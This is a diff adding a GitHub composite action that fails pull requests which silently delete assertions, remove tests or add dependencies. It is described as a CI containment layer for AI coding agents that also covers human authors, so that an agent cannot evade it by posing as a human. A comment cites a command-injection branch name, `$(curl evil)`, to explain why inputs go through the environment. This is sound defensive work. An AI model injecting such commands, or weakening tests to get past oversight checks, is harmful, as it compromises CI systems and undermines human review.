@@ -1,0 +1,66 @@
+name: agent-forge test-guard
+description: >
+  Fail a pull request that makes a repository's tests weaker without saying so.
+
+  Answers one question a diff review routinely misses: did this change delete an
+  assertion, drop a test file, or add a dependency? All three look like ordinary
+  lines in a large diff. None is forbidden — each has an explicit approval path
+  declared in the pull request BODY — but none happens silently.
+
+  This is layer 3 of agent-forge's containment. Layers 1 and 2 (a hook inside the
+  agent's slot, a diff scan in the orchestrator loop) are the platform judging its
+  own output: if the orchestrator has a bug, it is also the thing that would have
+  caught it. This runs in the product repository's own CI, where the merge actually
+  happens, so it is the layer that still works when the platform is wrong.
+
+  It applies to HUMAN pull requests too, deliberately. A check that exempts humans
+  is a check that tells an agent to open its pull request as a human.
+
+  The script is standard-library Python and imports nothing from agent-forge — it
+  runs in repositories that have never heard of the platform. It lives here rather
+  than being copied into each repository so that fixing it once fixes it everywhere:
+  the copy-per-repo version drifted, and drifted in the direction nobody watches,
+  with a target repository AHEAD of the canonical template on a security fix.
+
+  Requires the caller to have checked out with fetch-depth: 0 — the guard diffs
+  against the merge base, which does not exist in a shallow clone.
+
+inputs:
+  base-ref:
+    description: >
+      Base BRANCH NAME, not a ref — `main`, not `origin/main`. The action prefixes
+      `origin/` itself, so a caller cannot accidentally pass a local branch that
+      does not track the remote.
+    required: true
+  body-file:
+    description: >
+      Path to a file holding the pull request body, where approvals are declared.
+      A FILE and not the body itself: the body is attacker-controlled text, and as
+      an argument a shell metacharacter in it would be interpreted.
+    required: false
+    default: ''
+  head-ref:
+    description: Ref to check. Defaults to the checked-out HEAD.
+    required: false
+    default: 'HEAD'
+
+runs:
+  using: composite
+  steps:
+    - name: test-guard
+      shell: bash
+      # Every value arrives THROUGH THE ENVIRONMENT rather than interpolated into
+      # the script. A branch name is attacker-controlled on a fork pull request and
+      # `${{ }}` expands before the shell sees it, so a branch called `$(curl evil)`
+      # would execute. This is not hypothetical for this particular action: the
+      # copied version of it shipped the interpolated form until zizmor flagged it
+      # in rally (#495).
+      env:
+        BASE_REF: ${{ inputs.base-ref }}
+        HEAD_REF: ${{ inputs.head-ref }}
+        BODY_FILE: ${{ inputs.body-file }}
+      run: |
+        python3 "${GITHUB_ACTION_PATH}/agent_forge_test_guard.py" \
+          --base "origin/${BASE_REF}" \
+          --head "${HEAD_REF}" \
+          --body-file "${BODY_FILE}"
